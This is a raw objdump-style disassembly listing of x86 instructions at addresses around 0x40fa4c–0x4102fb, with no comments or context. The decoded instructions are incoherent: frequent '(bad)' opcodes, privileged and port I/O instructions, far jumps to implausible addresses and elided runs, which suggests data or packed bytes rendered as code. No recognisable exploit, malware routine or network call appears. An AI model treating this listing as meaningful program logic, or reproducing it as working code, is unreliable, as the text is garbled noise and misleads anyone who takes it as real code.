  40fa4c:	imul   edx,DWORD PTR [edi+ebx*8-0x2b12f68e],0xb
  40fa54:	mov    ah,0xf9
  40fa56:	test   eax,0xb4ecba82
  40fa5b:	btr    DWORD PTR [esi-0x9],esp
  40fa5f:	imul   ecx,DWORD PTR [ecx+ebx*2+0x8],0x36
	...
  40fa78:	pmaxsw mm7,QWORD PTR [ebx-0x27]
  40fa7c:	push   cs
  40fa7d:	push   0x59561100
  40fa82:	cmc    
  40fa83:	push   ds
  40fa84:	punpcklwd mm2,DWORD PTR [eax]
  40fa87:	push   ss
  40fa88:	test   DWORD PTR [eax-0x3786b0b],ecx
  40fa8e:	hlt    
  40fa8f:	mov    bl,0xe
  40fa91:	jmp    0x40faf3
  40fa93:	sbb    eax,0xf6085577
  40fa98:	fs pushf 
  40fa9a:	loopne 0x40fb09
  40fa9c:	cdq    
  40fa9d:	xchg   esp,eax
  40fa9e:	or     dl,dh
  40faa0:	iret   
  40faa1:	pusha  
  40faa2:	imul   edx,DWORD PTR [ecx-0x52],0x72
  40faa6:	inc    edi
  40faa7:	jmp    0xe971d663
  40faac:	(bad)  
  40faad:	sbb    eax,0xca27c14c
  40fab2:	ins    DWORD PTR es:[edi],dx
  40fab3:	sub    BYTE PTR [eax-0x48268415],dl
  40fab9:	dec    ecx
  40faba:	xor    ch,cl
  40fabc:	(bad)  
  40fabd:	lahf   
  40fabe:	enter  0x861d,0x97
  40fac2:	dec    ebx
  40fac3:	mov    eax,ds:0x96185118
  40fac8:	add    al,0x9c
  40faca:	loopne 0x40fa9a
  40facc:	jmp    0x7cea:0x776af5ea
  40fad3:	mov    ch,0x18
  40fad5:	push   ecx
  40fad6:	hlt    
  40fad7:	add    DWORD PTR [ecx+0x2fe594],ecx
	...
  40faed:	add    BYTE PTR [eax],al
  40faef:	add    BYTE PTR [esi],cl
  40faf1:	popa   
  40faf2:	add    BYTE PTR [ecx-0x25],dl
  40faf5:	pop    ebp
  40faf6:	cmc    
  40faf7:	pop    esi
  40faf8:	push   cs
  40faf9:	popa   
  40fafa:	add    al,0x56
  40fafc:	les    edx,FWORD PTR [ebx-0x1536dd20]
  40fb02:	cmc    
  40fb03:	add    BYTE PTR [edx-0x14],cl
  40fb06:	icebp  
  40fb07:	jmp    eax
  40fb09:	lahf   
  40fb0a:	loopne 0x40fb6a
  40fb0c:	out    dx,eax
  40fb0d:	push   ss
  40fb0e:	idiv   edi
  40fb10:	loopne 0x40faa1
  40fb12:	cmc    
  40fb13:	jne    0x40faa6
  40fb15:	push   ss
  40fb16:	jge    0x40fb20
  40fb18:	popf   
  40fb19:	sbb    eax,0x589aff40
  40fb1e:	(bad)  
  40fb1f:	adc    al,0x65
  40fb21:	int3   
  40fb22:	sub    ah,0xe6
  40fb25:	push   ebx
  40fb26:	std    
  40fb27:	push   esi
  40fb28:	not    BYTE PTR [esi+esi*2+0x4b]
  40fb2c:	xor    al,0x97
  40fb2e:	or     BYTE PTR [ecx+ebp*8+0x12],dh
  40fb32:	xor    eax,0xf5d79e7a
  40fb37:	jmp    ecx
  40fb39:	loope  0x40fac5
  40fb3b:	cmp    eax,0x48d927
  40fb40:	and    eax,0x60c75fe3
  40fb45:	adc    al,0xf6
  40fb47:	push   DWORD PTR ds:0xdd45cd97
  40fb4d:	(bad)
  40fb51:	sbb    cl,BYTE PTR [ebp-0x4]
	...
  40fb68:	push   ebp
  40fb69:	sbb    ecx,DWORD PTR [ebp-0x8]
  40fb6c:	(bad)  
  40fb6f:	addr16 push edx
  40fb71:	std    
  40fb72:	dec    eax
  40fb73:	add    BYTE PTR [edx],cl
  40fb75:	xor    DWORD PTR [edx+0x4b],0xffffffa4
  40fb79:	nop
  40fb7a:	add    eax,eax
  40fb7c:	loope  0x40fb4d
  40fb7e:	mov    bh,BYTE PTR [ebp+0x5d]
  40fb81:	nop
  40fb82:	jl     0x40fbc1
  40fb84:	data16 jmp 0x40fb78
  40fb87:	add    BYTE PTR [ecx+0x697581ab],dh
  40fb8d:	jns    0x40fba2
  40fb8f:	push   esi
  40fb90:	mov    WORD PTR [esi+0x32],?
  40fb93:	inc    DWORD PTR [edx-0x1b]
  40fb96:	mov    BYTE PTR [ebp-0x70],dh
  40fb99:	push   edx
  40fb9a:	repnz pop es
  40fb9c:	stos   DWORD PTR es:[edi],eax
  40fb9d:	and    bh,BYTE PTR [edx]
  40fb9f:	call   FWORD PTR [ecx]
  40fba1:	cmc    
  40fba2:	popa   
  40fba3:	fstp   QWORD PTR [edx-0x6ca27847]
  40fba9:	pop    ds
  40fbaa:	jb     0x40fb2e
  40fbac:	push   edx
  40fbad:	lock mov WORD PTR [esp+eax*4-0x4],?
  40fbb2:	std    
  40fbb3:	add    al,0xf
  40fbb5:	fimul  DWORD PTR [ecx]
  40fbb7:	jne    0x40fc14
  40fbb9:	xchg   ebx,eax
  40fbba:	std    
  40fbbb:	sti    
  40fbbc:	imul   eax,ecx,0x7
  40fbbf:	dec    ebx
  40fbc0:	int    0xfb
  40fbc2:	out    0xc8,eax
  40fbc4:	dec    esi
  40fbc5:	lock or DWORD PTR [ebp+0x7],edx
  40fbc9:	ror    BYTE PTR [ebx+eax*8+0x0],0x0
	...
  40fbdd:	add    BYTE PTR [eax],al
  40fbdf:	add    BYTE PTR [eax-0x51],al
  40fbe2:	aas    
  40fbe3:	inc    esp
  40fbe4:	inc    esp
  40fbe5:	cld    
  40fbe6:	or     DWORD PTR [eax],eax
  40fbe8:	mov    WORD PTR [edx],?
  40fbea:	iret   
  40fbeb:	repz mov ebx,?
  40fbee:	or     DWORD PTR [eax],eax
  40fbf0:	sub    esp,DWORD PTR [ecx+0x1fc98f1c]
  40fbf6:	pop    ebx
  40fbf7:	ins    BYTE PTR es:[edi],dx
  40fbf8:	sbb    BYTE PTR [esi+0xc],dl
  40fbfb:	push   0xffffff8c
  40fbfd:	test   DWORD PTR [edx+ebp*2],ecx
  40fc00:	mov    WORD PTR [edx],cs
  40fc02:	(bad)  
  40fc03:	sti    
  40fc04:	add    ecx,DWORD PTR [ecx-0x6a7395e8]
  40fc0a:	or     al,0xe8
  40fc0c:	xchg   ecx,eax
  40fc0d:	ror    DWORD PTR [ecx],cl
  40fc0f:	add    BYTE PTR [edi+0x3c34fe3b],dl
  40fc15:	mov    esp,DWORD PTR [eax+eiz*8+0x48]
  40fc19:	jp     0x40fba3
  40fc1b:	mov    BYTE PTR [ecx-0x6c],cl
  40fc1e:	fidiv  DWORD PTR [di]
  40fc21:	xchg   esp,eax
  40fc22:	fld    DWORD PTR [ebx]
  40fc24:	pop    ebp
  40fc25:	jmp    0x5ffb77fe
  40fc2a:	inc    ebx
  40fc2b:	cmp    BYTE PTR [eax],0x98
  40fc2e:	fld    DWORD PTR [ebx]
  40fc30:	ss xchg esp,eax
  40fc32:	push   edi
  40fc33:	js     0x40fc8f
  40fc35:	xchg   esp,eax
  40fc36:	fisttp WORD PTR [esp+ecx*8]
  40fc39:	pop    edi
  40fc3a:	(bad)  
  40fc3b:	sbb    BYTE PTR [eax],0xec
  40fc3e:	pop    ss
  40fc3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc40:	xlat   BYTE PTR ds:[ebx]
  40fc41:	jmp    0x41445c
	...
  40fc56:	add    BYTE PTR [eax],al
  40fc58:	enter  0xdfec,0x3
  40fc5c:	mov    WORD PTR [edx+eiz*2+0x73947bfe],ss
  40fc63:	shr    DWORD PTR [edx+0x5f],1
  40fc66:	test   DWORD PTR [eax-0x7ff81328],0xcdf94a3
  40fc70:	dec    esp
  40fc71:	pusha  
  40fc72:	cs aam 0x4a
  40fc75:	pop    edi
  40fc76:	imul   DWORD PTR [ebx-0x21]
  40fc79:	mov    eax,ds:0x95d503df
  40fc7e:	mov    al,ds:0x19fd5b8b
  40fc83:	test   BYTE PTR [ebx-0x69],ah
  40fc86:	cmp    al,0x28
  40fc88:	dec    edx
  40fc89:	xchg   esp,eax
  40fc8a:	(bad)  
  40fc8c:	xor    ebp,DWORD PTR [ecx-0x6273fc02]
  40fc92:	lahf   
  40fc93:	clc    
  40fc94:	mov    al,ds:0x786c2f44
  40fc99:	pop    eax
  40fc9a:	sahf   
  40fc9b:	jg     0x40fca1
  40fc9d:	dec    edi
  40fc9e:	fstp   QWORD PTR [ecx+ebp*8-0xc]
  40fca3:	ja     0x40fce3
  40fca5:	cld    
  40fca6:	push   ebp
  40fca7:	shl    dl,1
  40fca9:	call   0x54d37eb6
  40fcae:	mov    BYTE PTR [ecx+0x66d75f8f],dh
  40fcb4:	(bad)
  40fcb7:	test   eax,0x62f5e9d3
	...
  40fcd0:	(bad)
  40fcd3:	and    BYTE PTR [esi-0x63],cl
  40fcd6:	or     BYTE PTR [esi+edx*1+0x442589fd],bl
  40fcdd:	aas    
  40fcde:	pop    ebp
  40fcdf:	push   0x4d
  40fce1:	es inc edx
  40fce3:	test   al,0x8f
  40fce5:	xchg   esp,eax
  40fce6:	jnp    0x40fcd7
  40fce8:	push   0x4a
  40fcea:	mov    edi,0x83949c2b
  40fcef:	lods   al,BYTE PTR ds:[esi]
  40fcf0:	call   DWORD PTR [edi-0xb]
  40fcf3:	xchg   esp,eax
  40fcf4:	cmp    esp,0xffffffaf
  40fcf7:	cwde   
  40fcf8:	jmp    0x2410:0x932901e6
  40fcff:	call   0x6cc89193
  40fd04:	shl    edi,cl
  40fd06:	cmc    
  40fd07:	stc    
  40fd08:	(bad)  
  40fd09:	xchg   edi,eax
  40fd0a:	mov    esi,esi
  40fd0c:	mov    BYTE PTR [eax+ecx*1-0xa13cb2a],dl
  40fd13:	push   esp
  40fd14:	mov    al,0xef
  40fd16:	dec    esp
  40fd17:	sbb    al,0xab
  40fd19:	out    0x1,al
  40fd1b:	test   eax,0xe80d1192
  40fd20:	(bad)  
  40fd21:	xchg   esp,eax
  40fd22:	cmc    
  40fd23:	xor    al,0xc
  40fd25:	out    0x7b,eax
  40fd27:	mov    eax,ds:0x286e27f7
  40fd2c:	mov    ah,bh
  40fd2e:	fst    DWORD PTR [edi+0x247fe67a]
	...
  40fd48:	jl     0x40fd30
  40fd4a:	jnp    0x40fd4c
  40fd4c:	adc    DWORD PTR [edi+0x7c],esp
  40fd4f:	clc    
  40fd50:	jge    0x40fd73
  40fd52:	outs   dx,DWORD PTR ds:[esi]
  40fd53:	inc    ecx
  40fd54:	in     eax,0x7b
  40fd56:	mov    ch,0xfe
  40fd58:	bound  esp,QWORD PTR [esi-0x80]
  40fd5b:	inc    ebp
  40fd5c:	pop    ebp
  40fd5d:	data16 jl 0x40fd5c
  40fd60:	(bad)  
  40fd61:	in     al,dx
  40fd62:	std    
  40fd63:	push   0x48ee71
  40fd68:	dec    ebp
  40fd69:	and    al,0xf4
  40fd6b:	call   DWORD PTR [edx+0x18]
  40fd6e:	dec    ebp
  40fd6f:	in     al,0x36
  40fd71:	xchg   esp,eax
  40fd72:	in     al,0x0
  40fd74:	mov    dl,0xf
  40fd76:	mov    eax,ds:0x8993a500
  40fd7b:	jge    0x40fd1a
  40fd7d:	xchg   ebx,eax
  40fd7e:	add    eax,0x8940284
  40fd83:	add    dh,ah
  40fd85:	xchg   esp,eax
  40fd86:	in     al,dx
  40fd87:	add    BYTE PTR [edx+0xf],dl
  40fd8a:	popf   
  40fd8b:	add    BYTE PTR [ebp-0x6d],dh
  40fd8e:	cmc    
  40fd8f:	jne    0x40fe0e
  40fd91:	jnp    0x40fdfc
  40fd93:	ss gs xchg ebx,eax
  40fd96:	xor    DWORD PTR [ebp-0x73],0xfd8bf41a
  40fd9d:	inc    edx
  40fd9e:	loopne 0x40fdf1
  40fda0:	pop    esi
  40fda1:	mov    dh,0x6e
  40fda3:	lods   eax,DWORD PTR ds:[esi]
  40fda4:	mov    eax,ds:0x81087aa0
  40fda9:	stos   DWORD PTR es:[edi],eax
  40fdaa:	jge    0x40fdb0
	...
  40fdc0:	and    DWORD PTR [eax-0x2c6efb1f],0x14a50a09
  40fdca:	es jb  0x40fdfc
  40fdcd:	adc    esi,edx
  40fdcf:	cmp    DWORD PTR [edx-0x1a137771],ebp
  40fdd5:	jnp    0x40fde2
  40fdd7:	or     BYTE PTR [ecx+edx*1-0xd378036],0x49
  40fddf:	fist   WORD PTR [eax+0x55a94de3]
  40fde5:	loop   0x40fe29
  40fde7:	je     0x40fdb3
  40fde9:	add    DWORD PTR [ecx-0x28a4fb4],0xffffffe7
  40fdf0:	sbb    edi,DWORD PTR [eax]
  40fdf2:	push   0xffffffc6
  40fdf4:	dec    ecx
  40fdf5:	push   ebp
  40fdf6:	or     al,0x0
  40fdf8:	mov    ebp,?
  40fdfa:	xchg   BYTE PTR [eax+ebx*8+0x2c],al
  40fdfe:	loopne 0x40fe00
  40fe00:	ss std 
  40fe02:	(bad)  
  40fe04:	xor    eax,0x8ffdffd
  40fe09:	cmp    BYTE PTR [esi+0x4f],dl
  40fe0c:	xchg   ebx,eax
  40fe0d:	mov    edi,0xfbcd4ab7
  40fe12:	add    al,al
  40fe14:	clc    
  40fe15:	(bad)  [eax-0x203ab84]
  40fe1b:	sbb    esi,DWORD PTR [ebx+0x1]
  40fe1e:	pop    esi
  40fe1f:	(bad)  
  40fe20:	loope  0x40fdd5
  40fe22:	jae    0x40fe98
	...
  40fe38:	push   0x5bebfee7
  40fe3d:	imul   eax,DWORD PTR [ecx],0x74f811e8
  40fe43:	dec    BYTE PTR [ebx+0x49]
  40fe46:	push   esp
  40fe47:	out    0x35,eax
  40fe49:	or     DWORD PTR [eax+eax*1],0xe778493b
  40fe50:	xor    eax,0x2bfe73b2
  40fe55:	test   eax,0xa21de764
  40fe5a:	jae    0x40fe5a
  40fe5c:	sbb    ebp,DWORD PTR [ecx-0x4dda18a0]
  40fe62:	jae    0x40fe62
  40fe64:	sbb    DWORD PTR [ebp-0x3ac8bdc],edx
  40fe6a:	pop    es
  40fe6b:	sar    edx,cl
  40fe6d:	in     eax,0x3e
  40fe6f:	faddp  st(4),st
  40fe71:	rcl    bl,cl
  40fe73:	add    eax,DWORD PTR [ecx+0x19]
  40fe76:	pushf  
  40fe77:	or     bh,0xe8
  40fe7a:	sbb    DWORD PTR [esi+eiz*2],eax
  40fe7d:	dec    edi
  40fe7e:	jle    0x40fe76
  40fe80:	mov    edi,esp
  40fe82:	(bad)  
  40fe84:	retf   0x78e5
  40fe87:	mov    bh,0xe5
  40fe8a:	fmul   QWORD PTR [ebx]
  40fe8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe8d:	mov    dl,0x5c
  40fe8f:	jl     0x40fe43
  40fe91:	jp     0x40fe7f
  40fe93:	imul   ebx,DWORD PTR [ecx-0x6983b1ab],0xffffffd4
  40fe9a:	mov    ebx,0x1d
	...
  40feaf:	add    BYTE PTR [esp+edi*2],bh
  40feb2:	(bad)  
  40feb3:	dec    edi
  40feb4:	push   ebx
  40feb5:	xchg   esp,eax
  40feb6:	mov    DWORD PTR [ebx],0xeb6df58c
  40febc:	sub    eax,0xdc03a06d
  40fec1:	in     eax,0x94
  40fec3:	or     esp,DWORD PTR [esp+esi*8-0x70]
  40fec7:	jl     0x40ff33
  40fec9:	cld    
  40feca:	push   ebx
  40fecb:	leave  
  40fecc:	(bad)  
  40fecd:	in     eax,0xf6
  40fecf:	cmc    
  40fed0:	push   edi
  40fed1:	in     eax,0x74
  40fed3:	or     esp,DWORD PTR [ebp+ecx*4-0x59]
  40fed7:	jl     0x40ff23
  40fed9:	(bad)  [ecx+0x7a3f8c00]
  40fedf:	push   0xd3dbd00e
  40fee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fee5:	xchg   esp,eax
  40fee6:	dec    ecx
  40fee7:	ret    0x5f2a
  40feea:	imul   DWORD PTR [ebx-0xb]
  40feed:	dec    esp
  40feee:	mov    dh,0x7b
  40fef0:	add    al,0x4f
  40fef2:	or     BYTE PTR [ebp+0x2154a803],dh
  40fef8:	shl    esp,1
  40fefa:	jne    0x40fee2
  40fefc:	(bad)  
  40fefd:	pusha  
  40fefe:	push   edi
  40feff:	adc    DWORD PTR [edi+0x6e],esp
  40ff02:	inc    edi
  40ff03:	jmp    0xd804ebe6
  40ff08:	(bad)  
  40ff09:	xchg   esp,eax
  40ff0a:	add    DWORD PTR [ecx-0x111e6d24],ebp
  40ff10:	out    0xed,eax
  40ff12:	ins    DWORD PTR es:[edi],dx
  40ff13:	sub    BYTE PTR [eax],al
	...
  40ff25:	add    BYTE PTR [eax],al
  40ff27:	add    BYTE PTR [eax+0x7e2de03d],cl
  40ff2d:	xchg   esp,eax
  40ff2e:	or     dl,dh
  40ff30:	dec    edi
  40ff31:	popa   
  40ff32:	sub    DWORD PTR [esi+0x565c9527],esi
  40ff38:	aaa    
  40ff39:	call   0xe960:0x4488d5c8
  40ff40:	(bad)  
  40ff41:	cmc    
  40ff42:	mov    dh,0xd1
  40ff44:	sbb    eax,0xbfe9476e
  40ff49:	in     eax,0x7b
  40ff4b:	loope  0x40ff44
  40ff4d:	mov    edi,DWORD PTR [ecx+0x26]
  40ff50:	pop    es
  40ff51:	cld    
  40ff52:	daa    
  40ff53:	mov    bl,0xf6
  40ff55:	loop   0x40ff4b
  40ff57:	fcmove st,st(7)
  40ff59:	sbb    al,0xf6
  40ff5b:	push   cs
  40ff5c:	out    0xe2,eax
  40ff5e:	cli    
  40ff5f:	push   edi
  40ff60:	mov    al,ds:0xd74e7b9b
  40ff65:	push   0x9c5cf6f4
  40ff6a:	loopne 0x40ffd3
  40ff6c:	dec    edi
  40ff6d:	jecxz  0x40ff64
  40ff6f:	inc    esi
  40ff70:	rcl    ebp,1
  40ff72:	or     al,0xe9
  40ff74:	pop    esp
  40ff75:	pmulhw mm5,QWORD PTR [eax+0x73]
  40ff79:	sar    ebp,cl
  40ff7b:	into   
  40ff7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff7d:	adc    BYTE PTR [eax+eax*1+0x49],cl
  40ff81:	enter  0x75f6,0x35
  40ff85:	pop    edi
  40ff86:	jl     0x40ff94
  40ff88:	dec    ebp
  40ff89:	jge    0x40ffc9
	...
  40ff9f:	add    ch,dh
  40ffa1:	xchg   edx,eax
  40ffa2:	enter  0x700f,0xa4
  40ffa6:	or     al,BYTE PTR [eax]
  40ffa8:	in     eax,0x56
  40ffaa:	dec    esp
  40ffab:	clc    
  40ffac:	in     eax,0x97
  40ffae:	or     BYTE PTR [eax],al
  40ffb0:	xor    dl,ch
  40ffb2:	in     eax,0xff
  40ffb4:	repnz xchg edi,eax
  40ffb6:	or     BYTE PTR [edx-0x1b],ch
  40ffb9:	icebp  
  40ffba:	cmc    
  40ffbb:	imul   esp,ebp,0x708cf5f1
  40ffc1:	push   0x67308d45
  40ffc6:	(bad)  
  40ffc7:	call   FWORD PTR [edx-0x39]
  40ffca:	div    BYTE PTR [ebp+0x5d]
  40ffcd:	pop    esi
  40ffce:	jl     0x40ffcc
  40ffd0:	dec    ebp
  40ffd1:	outs   dx,BYTE PTR ds:[esi]
  40ffd2:	cmp    al,0x0
  40ffd4:	mov    ch,0x92
  40ffd6:	enter  0xb074,0x70
  40ffda:	std    
  40ffdb:	add    DWORD PTR [ebp+0x2db46097],esp
  40ffe1:	fdiv   st,st(5)
  40ffe3:	(bad)  
  40ffe4:	and    BYTE PTR [edi+0x5e2840e0],al
  40ffea:	not    BYTE PTR [eax-0x12]
  40ffed:	inc    edi
  40ffee:	test   BYTE PTR [ebp-0x9997b],al
  40fff4:	add    eax,0x2830edc9
  40fff9:	pop    esi
  40fffa:	test   BYTE PTR [ecx-0x18420],0x3a
  410001:	outs   dx,BYTE PTR ds:[esi]
  410002:	mov    ecx,DWORD PTR [ecx+0x0]
	...
  410015:	add    BYTE PTR [eax],al
  410017:	add    BYTE PTR [edx],ch
  410019:	pop    ebp
  41001a:	test   BYTE PTR [ebp+0x61],al
  41001d:	enter  0x546d,0x8c
  410021:	push   ebp
  410022:	leave  
  410023:	jmp    FWORD PTR [edx]
  410025:	or     BYTE PTR [ecx-0xa],ah
  410028:	and    ebx,edx
  41002a:	outs   dx,DWORD PTR ds:[esi]
  41002b:	je     0x40ffb5
  41002d:	lds    eax,FWORD PTR [edi-0x7dd5ecb5]
  410033:	test   ah,ah
  410035:	sub    DWORD PTR [eax-0x2],esi
  410038:	jbe    0x410027
  41003a:	loope  0x410098
  41003c:	lods   al,BYTE PTR fs:[esi]
  41003e:	or     al,0xff
  410040:	cmp    DWORD PTR [ecx],ebx
  410042:	js     0x410042
  410044:	jmp    0x410057
  410046:	out    0xb,al
  410048:	hlt    
  410049:	mov    al,al
  41004b:	(bad)  
  41004c:	(bad)  [ebx+0x75]
  41004f:	out    0xdb,eax
  410051:	imul   ebp,DWORD PTR [edi+0x69],0x67e4958c
  410058:	dec    ebp
  410059:	in     eax,dx
  41005a:	jo     0x410010
  41005c:	test   al,0x49
  41005e:	outs   dx,DWORD PTR ds:[esi]
  41005f:	(bad)  
  410060:	mov    bl,0xbf
  410062:	or     eax,0x71013de8
  410067:	(bad)  
  410068:	adc    eax,0x9bf66870
  41006d:	mov    eax,ds:0xa1b8848d
  410072:	outs   dx,DWORD PTR ds:[esi]
  410073:	(bad)  
  410074:	(bad)  
  410076:	mov    DWORD PTR [edi-0x33],esp
  410079:	jmp    0x4100eb
  41007b:	mov    ah,0x0
	...
  41008d:	add    BYTE PTR [eax],al
  41008f:	add    BYTE PTR [eax-0x75],ch
  410092:	outs   dx,DWORD PTR ds:[esi]
  410093:	(bad)  
  410094:	jae    0x410097
  410096:	push   cs
  410097:	call   0xfeb20039
  41009c:	xchg   edi,eax
  41009d:	stos   DWORD PTR es:[edi],eax
  41009e:	clc    
  41009f:	sbb    BYTE PTR [edi],cl
  4100a1:	mov    eax,ds:0xeb53f658
  4100a6:	cmc    
  4100a7:	je     0x410045
  4100a9:	repnz cmp DWORD PTR [edi+0x70bf9509],ecx
  4100b0:	cmp    ah,dl
  4100b2:	das    
  4100b3:	ins    BYTE PTR es:[edi],dx
  4100b4:	xor    DWORD PTR [ebp-0x22],ecx
  4100b7:	js     0x4100ef
  4100b9:	mov    edx,ebp
  4100bb:	inc    ebx
  4100bc:	lahf   
  4100bd:	call   0x78b6:0x4d1d6c0f
  4100c4:	dec    edx
  4100c5:	sbb    al,al
  4100c7:	jo     0x4100d3
  4100c9:	loop   0x4100a7
  4100cb:	add    ecx,DWORD PTR [esp+edx*4+0x71640419]
  4100d2:	pop    ss
  4100d3:	ret    
  4100d4:	repz loop 0x41012b
  4100d7:	addr16 loop 0x4100bb
  4100da:	xchg   BYTE PTR [eax+0x58],bh
  4100dd:	nop
  4100de:	xchg   edi,eax
  4100df:	ins    BYTE PTR es:[edi],dx
  4100e0:	inc    esi
  4100e1:	loope  0x410159
  4100e3:	mov    cl,BYTE PTR [eax]
  4100e5:	shl    DWORD PTR [esi+0x78],0xca
  4100e9:	outs   dx,BYTE PTR ds:[esi]
  4100ea:	fucomip st,st(3)
  4100ec:	push   ss
  4100ed:	ins    DWORD PTR es:[edi],dx
  4100ee:	mov    al,ds:0x4427bb03
  4100f3:	jo     0x4100f5
	...
  410105:	add    BYTE PTR [eax],al
  410107:	add    BYTE PTR [edx-0x6811a11f],dh
  41010d:	in     al,dx
  41010e:	das    
  41010f:	int3   
  410110:	mov    ds:0xcb7e78e1,al
  410115:	jmp    0x204f7950
  41011a:	sbb    BYTE PTR [eax-0x76],dh
  41011d:	loope  0x4100fe
  41011f:	or     BYTE PTR [eax],cl
  410121:	or     al,ah
  410123:	add    ecx,DWORD PTR [esp+ebp*2-0x6b331483]
  41012a:	ins    BYTE PTR es:[edi],dx
  41012b:	mov    esi,0xae06445f
  410130:	cmp    ebp,ecx
  410132:	push   cs
  410133:	js     0x4101a8
  410135:	xchg   edx,eax
  410136:	jno    0x4101b0
  410138:	push   edx
  410139:	lea    ecx,[eax]
  41013b:	sub    DWORD PTR [ebx],edi
  41013d:	pop    ebp
  41013e:	mov    DWORD PTR [ebx+esi*4-0x1f],ebp
  410142:	jns    0x4101a3
  410144:	mov    ebp,cr5
  410147:	(bad)  
  410148:	mov    ebx,0x355d08e2
  41014d:	push   ss
  41014e:	mov    ah,0xc1
  410150:	mov    bl,0xe2
  410152:	cmc    
  410153:	jmp    0xd9a17683
  410158:	(bad)  
  410159:	icebp  
  41015a:	mov    dh,0xb6
  41015c:	std    
  41015d:	cwde   
  41015e:	loopne 0x410130
  410160:	int3   
  410161:	loope  0x410158
  410163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410164:	cmp    eax,0x7b9efdf9
  410169:	loop   0x4101e6
  41016b:	loope  0x41016d
	...
  41017d:	add    BYTE PTR [eax],al
  41017f:	add    BYTE PTR [edi+0x70],dh
  410182:	dec    ebx
  410183:	mov    ds,WORD PTR [ebx-0x1e]
  410186:	mov    ebx,0xf5e26b8d
  41018b:	jle    0x41016a
  41018d:	cwde   
  41018e:	loopne 0x4101a6
  410190:	int    0xe1
  410192:	cmc    
  410193:	outs   dx,BYTE PTR ds:[esi]
  410194:	mov    ebp,0x589cf5e4
  410199:	jmp    0x4100:0x683b5ef5
  4101a0:	outs   dx,BYTE PTR ds:[esi]
  4101a1:	push   edi
  4101a2:	cmc    
  4101a3:	dec    esi
  4101a4:	sbb    ebp,DWORD PTR [eax]
  4101a6:	jmp    0xf62324e9
  4101ab:	mov    ah,0x87
  4101ad:	in     al,dx
  4101ae:	(bad)  
  4101af:	lods   eax,DWORD PTR ds:[esi]
  4101b0:	add    bl,bh
  4101b2:	cmc    
  4101b3:	je     0x410199
  4101b5:	out    0xf5,al
  4101b7:	add    ebp,DWORD PTR es:[ecx+0x0]
  4101bb:	adc    DWORD PTR [esi-0x1ce90aa7],edi
  4101c1:	sub    cl,bl
  4101c3:	push   ss
  4101c4:	fcmovnu st,st(6)
  4101c6:	cmc    
  4101c7:	add    al,bl
  4101c9:	mov    esp,eax
  4101cb:	and    al,0x28
  4101cd:	addr16 idiv bh
  4101d0:	mov    BYTE PTR [eax-0x2],al
  4101d3:	push   DWORD PTR [edx]
  4101d5:	ins    BYTE PTR es:[edi],dx
  4101d6:	or     ecx,DWORD PTR [eax+0x32]
  4101d9:	div    BYTE PTR [di+0x6f5d]
  4101de:	idiv   bh
  4101e0:	dec    ebp
  4101e1:	pop    ebx
  4101e2:	dec    esi
  4101e3:	inc    DWORD PTR [eax]
	...
  4101f5:	add    BYTE PTR [eax],al
  4101f7:	add    BYTE PTR [edx+0x67],dl
  4101fa:	mov    esp,0xf666dadc
  4101ff:	call   0x3820d9
  410204:	inc    edx
  410205:	and    eax,0x6732f7ea
  41020a:	in     eax,dx
  41020b:	in     eax,0xaa
  41020d:	addr16 idiv bh
  410210:	pop    eax
  410211:	inc    ebx
  410212:	(bad)  
  410213:	inc    DWORD PTR [edx]
  410215:	ins    BYTE PTR es:[edi],dx
  410216:	iret   
  410217:	inc    edi
  410218:	adc    ah,BYTE PTR [edi-0xa]
  41021b:	mov    ch,0x1
  41021d:	outs   dx,DWORD PTR ds:[esi]
  41021e:	idiv   bh
  410220:	push   edx
  410221:	in     al,0x1
  410223:	dec    eax
  410225:	mov    esp,eax
  410227:	(bad)  
  410228:	xor    BYTE PTR [esi-0xa],ah
  41022b:	call   FWORD PTR [eax]
  41022d:	js     0x41022d
  41022f:	call   DWORD PTR [edx+0x6b]
  410232:	mov    bl,0x47
  410234:	inc    edx
  410235:	data16 test BYTE PTR [ebp+0x3d],0x70
  41023a:	iret   
  41023b:	std    
  41023c:	push   edx
  41023d:	data16 div BYTE PTR [ebp+0x51]
  410241:	imul   ecx,edi,0x33
  410244:	jne    0x4101d9
  410246:	mov    edi,0x5b9361c2
  41024b:	mov    esp,DWORD PTR [ecx-0x1f1b35ee]
  410251:	aam    0xf1
  410253:	push   eax
  410254:	mov    WORD PTR ds:0xedcd683f,ss
  41025a:	loope  0x41025b
	...
  410270:	repz sub al,0xa
  410273:	(bad)  
  410274:	fyl2x  
  410276:	popa   
  410277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410278:	(bad)  
  410279:	out    0x7b,al
  41027b:	or     cl,BYTE PTR [ecx+ebp*2-0x1e]
  41027f:	dec    edi
  410280:	vmread DWORD PTR [eax+0x3],esi
  410284:	mov    ecx,0x1b2f7b9e
  410289:	mov    al,0x74
  41028b:	and    BYTE PTR [ecx-0x73ff873b],0xed
  410292:	jecxz  0x41029a
  410294:	dec    ebx
  410295:	mov    eax,0xed8df374
  41029a:	or     ebx,ebp
  41029c:	dec    esi
  41029d:	cs out 0xf7,al
  4102a0:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4102a2:	in     al,0x40
  4102a4:	mov    WORD PTR [eax-0x4b],?
  4102a7:	jecxz  0x4102e5
  4102a9:	adc    eax,0xed8c32e6
  4102ae:	mov    bl,al
  4102b0:	mov    BYTE PTR [ebx+0x19498d0c],al
  4102b6:	frstor [edi-0x74]
  4102b9:	xchg   ebp,eax
  4102ba:	leave  
  4102bb:	inc    edx
  4102bd:	out    0xd,eax
  4102bf:	call   0xfebe261d
  4102c4:	xchg   DWORD PTR [ebp-0x2ac3ec08],ebp
  4102ca:	or     al,BYTE PTR [eax]
  4102cc:	mov    bl,0xe
  4102ce:	(bad)  
  4102d0:	and    ebp,esp
  4102d2:	popa   
  4102d3:	add    BYTE PTR ds:[eax],al
	...
  4102e6:	add    BYTE PTR [eax],al
  4102e8:	and    DWORD PTR [esi+0x2eb9e77b],ebx
  4102ee:	jge    0x4102ee
  4102f0:	add    DWORD PTR [ecx],0x72
  4102f3:	cmp    cl,0x94
  4102f6:	daa    
  4102f7:	add    al,0xf9
  4102f9:	sbb    al,0x18
  4102fb:	adc    eax,0x4b1eddd3
